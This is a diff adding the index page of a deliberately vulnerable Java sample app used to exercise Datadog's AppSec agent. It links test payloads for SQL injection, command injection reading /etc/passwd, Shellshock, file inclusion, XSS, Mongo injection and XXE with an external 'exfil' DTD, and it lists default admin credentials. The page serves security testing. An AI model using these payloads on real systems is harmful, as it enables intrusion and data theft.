@@ -1,0 +1,259 @@
+<html xmlns="http://www.w3.org/1999/xhtml"
+      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+      xmlns:th="http://www.thymeleaf.org"
+>
+<head>
+  <title>Java Agent Sample Application</title>
+  <script
+    src="https://code.jquery.com/jquery-3.4.1.min.js"
+    integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+    crossorigin="anonymous"></script>
+</head>
+<body>
+<h1>Sample Application for DataDog AppSec</h1>
+
+<div th:if="${message}">
+  <div style="border: 1px solid black" th:text="${message}"/>
+</div>
+
+<p>Greeting at <a th:href="@{/hello}">/hello</a>, async greeting at <a th:href="@{/hello/async}">/hello/async</a>.</p>
+<p>There is also a <a th:href="@{/hello/secret}">secret greeting</a>
+  (requires login, default user: <em>admin</em>, password: <em>admin123</em>).</p>
+<p><a th:href="@{/posts}">View/add posts</a></p>
+
+<h2>Datadog Java Agent Information</h2>
+
+<p th:if="${@appSecInfo.problem}" th:inline="text"><strong>Problem:</strong> [[${@appSecInfo.problem}]]</p>
+<div th:unless="${@appSecInfo.problem}">
+  <ul>
+    <li th:inline="text"><strong>Agent version: </strong> [[${@appSecInfo.ddVersion}]]</li>
+    <li th:inline="text"><strong>Application Server: </strong> [[${@appSecInfo.applicationProviderVersion}]]</li>
+    <li th:inline="text"><strong>Pack id: </strong>[[${@appSecInfo.packId}]]</li>
+    <li th:inline="text"><strong>Loaded rules: </strong>
+      <div th:each="ruleName: ${@appSecInfo.ruleNames}" style="display: inline">
+        <a th:href="@{/rule(name=${ruleName})}">[[${ruleName}]]</a>
+      </div>
+      ([[${@appSecInfo.ruleNames.size()}]])</li>
+  </ul>
+</div>
+
+<h2>Vulnerabilities</h2>
+<ul>
+  <li>SQL injection:
+    <ul>
+      <li><a href="posts/1%20OR%201%20=%201">posts/1%20OR%201%20=%201</a></li>
+      <li><a href="#post_plain" id="post_plain">POST posts/show/ body <code>1 OR 1 = 1</code></a></li>
+      <li><a href="#post_json" id="post_json">POST posts/show/ body <code>{"id": "1 OR 1 = 1"}</code></a></li>
+      <li><a href="#put_mp_plain" id="put_mp_plain">POST posts/show/ multi-part body with plain part</a></li>
+      <li><a href="#put_mp_json" id="put_mp_json">POST posts/show/RequestPart/ multi-part body with json</a></li>
+      <li><a href="posts/1%20OR%201%20=%201">posts/1%20OR%201%20=%201</a></li>
+      <li><a href="posts/jpa/1%20OR%201%20=%201">posts/jpa/1%20OR%201%20=%201</a></li>
+      <li><a href="posts/jpaNative/1%20OR%201%20=%20:p">posts/jpa/1%20OR%201%20=%20:p</a></li>
+      <li><a href="posts/hibernate/1%20OR%201%20=%201">posts/hibernate/1%20OR%201%20=%201</a></li>
+      <li><a href="posts/hibernateNative/1%20OR%201%20=%20:p">posts/hibernateNative/1%20OR%201%20=%20:p</a></li>
+    </ul>
+  </li>
+  <li>MongoDB injection
+    <ul>
+      <li><a href="mongo?name=%7B%22%24eq%22%3A%22Joseph%22%7D">mongo?name=%7B%22%24eq%22%3A%22Joseph%22%7D</a></li>
+      <li><a href="mongo/delete?filter=%7B%22%24eq%22%3A%22Joseph%22%7D">mongo/delete?filter=%7B%22%24eq%22%3A%22Joseph%22%7D (unacknowledged)</a></li>
+    </ul>
+  </li>
+  <li>WAF
+    <ul>
+      <li><a href="waf">waf</a></li>
+    </ul>
+  </li>
+  <li>Shell injection: <a href="ping/?q=127.0.0.1%3Bcat%20/etc/passwd">ping/?q=127.0.0.1%3Bcat%20/etc/passwd</a></li>
+  <li>Webshell: <a href="ping/?ip=127.0.0.1&amp;x=ping">ping/?ip=127.0.0.1&amp;x=ping</a></li>
+  <li>Shellshock: <a href="shellshock/?q=%28%29+%7B+%3A%3B+%7D%3B+%2Fbin%2Feject">shellshock/?q=%28%29+%7B+%3A%3B+%7D%3B+%2Fbin%2Feject</a></li>
+  <li>Local File injection:
+    <ul>
+      <li><a href="lfi/?q=/etc/passwd">lfi/?q=/etc/passwd (FileInputStream)</a></li>
+      <li><a href="lfi/?q=/etc/passwd&amp;strategy=file_channel">lfi/?q=/etc/passwd&amp;strategy=file_channel (FileChannel)</a></li>
+      <li><a href="lfi/?q=/etc/passwd&amp;strategy=random_access_file">lfi/?q=/etc/passwd&amp;strategy=random_access_file (RandomAccessFile)</a></li>
+    </ul>
+  </li>
+  <li>Eval:
+    <ul>
+      <li><a href="eval/?q=%27foo%27+%2B+%27bar%27">eval/?q=%27foo%27+%2B+%27bar%27 (eval string)</a></li>
+      <li><a href="eval/?q=%27foo%27+%2B+%27bar%27&amp;strategy=eval_reader">eval/?q=%27foo%27+%2B+%27bar%27&amp;strategy=eval_reader (eval reader)</a></li>
+      <li><a href="eval/?q=%27foo%27+%2B+%27bar%27&amp;strategy=compile">eval/?q=%27foo%27+%2B+%27bar%27&amp;strategy=compile (compile)</a></li>
+    </ul>
+  </li>
+  <li>XSS:
+    <ul>
+      <li>Thymeleaf 2: <a href="xss/?q=%3Cscript%3Ealert%281%29%3C/script%3E">xss/?q=%3Cscript%3Ealert%281%29%3C/script%3E</a></li>
+      <li>Thymeleaf 3: <a href="xss/?suffix=.tl3&amp;q=%3Cscript%3Ealert%281%29%3C/script%3E">xss/?q=%3Cscript%3Ealert%281%29%3C/script%3E</a></li>
+      <li>FreeMarker: <a href="xss/?suffix=.ftl&amp;q=%3Cscript%3Ealert%281%29%3C/script%3E">xss/?suffix=.ftl&amp;q=%3Cscript%3Ealert%281%29%3C/script%3E</a> (contains unescaped material)</li>
+      <li>Velocity: <a href="xss/?suffix=.vm&amp;q=%3Cscript%3Ealert%281%29%3C/script%3E">xss/?suffix=.vm&amp;q=%3Cscript%3Ealert%281%29%3C/script%3E</a></li>
+      <li>JSP: <a href="xss/?suffix=.jsp&amp;q=%3Cscript%3Ealert%281%29%3C/script%3E">xss/?suffix=.jsp&amp;q=%3Cscript%3Ealert%281%29%3C/script%3E</a></li>
+      <li>gsp: <a href="xss/?suffix=.gsp&amp;q=%3Cscript%3Ealert%281%29%3C/script%3E">xss/?suffix=.gsp&amp;q=%3Cscript%3Ealert%281%29%3C/script%3E</a></li>
+    </ul>
+  </li>
+  <li>XXE:
+    <ul>
+      <li>JDK: <a href="#stax_jdk" id="stax_jdk">POST xxe_form?variant=stax_jdk</a></li>
+      <li>JDK (Spring): <a href="#stax_jdk_spring" id="stax_jdk_spring">POST xxe_form_spring?variant=stax_jdk</a></li>
+      <li>Xerces: <a href="#jax_xerces" id="jax_xerces">POST xxe_form?variant=jax_xerces</a></li>
+      <li>Xerces (Spring): <a href="#jax_xerces_spring" id="jax_xerces_spring">POST xxe_form_spring?variant=jax_xerces</a></li>
+      <li>Woodstox: <a href="#stax_woodstox" id="stax_woodstox">POST xxe_form?variant=stax_woodstox</a></li>
+      <li>Woodstox (Spring): <a href="#stax_woodstox_spring" id="stax_woodstox_spring">POST xxe_form_spring?variant=stax_woodstox</a></li>
+      <li>SJXSP: <a href="#stax_sjxsp" id="stax_sjxsp">POST xxe_form?variant=stax_sjxsp</a></li>
+      <li>SJXSP (Spring): <a href="#stax_sjxsp_spring" id="stax_sjxsp_spring">POST xxe_form_spring?variant=stax_sjxsp</a></li>
+      <li>JDK (indirect): <a href="#stax_jdk_indirect" id="stax_jdk_indirect">POST xxe_form?variant=stax_jdk</a></li>
+    </ul>
+  </li>
+</ul>
+
+<h2>User tracking</h2>
+
+<p>Current user: <strong th:text="${#authentication.name}">user name</strong></p>
+
+<h4>Login:</h4>
+<form th:action="@{/login/}" method="post">
+  <input type="text" name="username" placeholder="Login"/>
+  <input type="text" name="password" placeholder='password'/>
+  <input type="submit" value="Submit"/>
+</form>
+
+
+<h4>Sign up:</h4>
+<form th:action="@{/signup/}" method="post">
+  <input type="text" name="username" placeholder='Login'/>
+  <input type="text" name="password" placeholder='password'/>
+  <input type="submit" value="Submit"/>
+</form>
+
+<h4>File upload</h4>
+<form th:action="@{/upload/}" method="post" enctype="multipart/form-data">
+  <table>
+    <tr>
+      <td>File to upload:</td>
+      <td><input type="file" name="file"/></td>
+    </tr>
+    <tr>
+      <td></td>
+      <td><input type="submit" value="Upload"/></td>
+    </tr>
+  </table>
+</form>
+
+Custom events
+<ul>
+  <li>
+    <a href="sdk/track?event=i.am.hungry"> Send 'i.am. hungry' event</a>
+  </li>
+  <li>
+    <a href="sdk/track?event=i.am.hungry&amp;login=albert"> Send 'i.am. hungry' event with 'albert' user</a>
+  </li>
+  <li>
+    <a href="sdk/track?event=i.am.hungry&amp;login=albert&amp;propertyName=mood&amp;propertyValue=grumpy">
+      Send 'i.am.hungry' event with 'albert' user and 'mood' property</a>
+  </li>
+  <li>
+    <a href="sa-sdk/event?event=i.am.hungry&amp;login=albert&amp;propertyName=mood&amp;propertyValue=grumpy">
+      Send 'i.am.full' event with 'albert' user and 'mood' property (via standalone SDK)</a>
+  </li>
+</ul>
+
+Misc
+<ul>
+  <li><a href="db/sqlSyntaxError?value=intentionalException">Trigger agent rule exception </a>(requires SQLi)</li>
+</ul>
+
+<script th:inline="text">
+  $('#post_plain').on('click', function() {
+    $.ajax('posts/show/', {
+      method: 'post',
+      contentType: 'text/plain',
+      data: '1 OR 1 = 1'
+    });
+  });
+  $('#post_json').on('click', function() {
+    $.ajax('posts/show/', {
+      method: 'post',
+      contentType: 'application/json',
+      data: '{"id": "1 OR 1 = 1"}'
+    });
+  });
+
+  const dataMultiPartPlain = ` --------------------------7acb01a99707e14a
+Content-Disposition: form-data; name="id"
+
+1 OR 1 = 1
+--------------------------7acb01a99707e14a--
+`;
+  $('#put_mp_plain') .on('click', function() {
+    $.ajax('posts/show/', {
+      method: 'put',
+      contentType: 'multipart/form-data; boundary=------------------------7acb01a99707e14a',
+      data: dataMultiPartPlain
+    });
+  });
+
+  const dataMultiPartJson = `--------------------------fb9d25b2268589df
+Content-Disposition: form-data; name="id"
+Content-Type: text/plain
+
+foobar
+--------------------------fb9d25b2268589df
+Content-Disposition: form-data; name="jsonData"
+Content-Type: application/json
+
+{"id": "1 OR 1 = 1"}
+--------------------------fb9d25b2268589df--
+`;
+  $('#put_mp_json').on('click', function() {
+    $.ajax('posts/show/RequestPart/', {
+      method: 'put',
+      contentType: 'multipart/form-data; boundary=------------------------fb9d25b2268589df',
+      data: dataMultiPartJson
+    });
+  });
+
+  const xmlPayload  = `
+\u003c!DOCTYPE data SYSTEM "[[${@appSecInfo.xxeFilesLocation}]]/sample.dtd" [
+	\u003c!ENTITY bar SYSTEM "[[${@appSecInfo.xxeFilesLocation}]]/sample.txt">
+]>
+\u003cdata>
+	\u003cname>&foo;\u003c/name>
+	\u003cemail>&bar;\u003c/email>
+\u003c/data>
+`;
+
+  const xmlPayloadIndirect  = `
+\u003c!DOCTYPE data SYSTEM "http://sqreen-ci-java.s3.amazonaws.com/xxe/indirect.dtd">
+\u003cdata>&exfil;\u003cdata>
+`;
+  ['stax_jdk', 'stax_jdk_indirect', 'jax_xerces', 'stax_woodstox', 'stax_sjxsp'].forEach(function(variant) {
+    const indirect = variant.endsWith('_indirect');
+    const realVariant = variant.replace('_indirect', '');
+    const payload = indirect ? xmlPayloadIndirect : xmlPayload;
+
+    $(`#${variant}`).on('click', function () {
+      $.ajax(`xxe_form?variant=${realVariant}`, {
+        method: 'post',
+        contentType: 'text/xml',
+        data: payload
+      });
+    });
+    $(`#${variant}_spring`).on('click', function () {
+      $.ajax(`xxe_form_spring?variant=${realVariant}`, {
+        method: 'post',
+        contentType: 'text/xml;replace_slash=true',
+        data: payload.replace(/\//g, 'SLASH')
+      });
+    });
+  });
+
+  $(document).ajaxSuccess(function (event, xhr, settings, data) {
+    window.alert("Success: " + data);
+  });
+  $(document).ajaxError(function (event, jqxhr, settings, thrownError) {
+    window.alert("Failure: " + thrownError);
+  });
+</script>
+
+</body>
+</html>
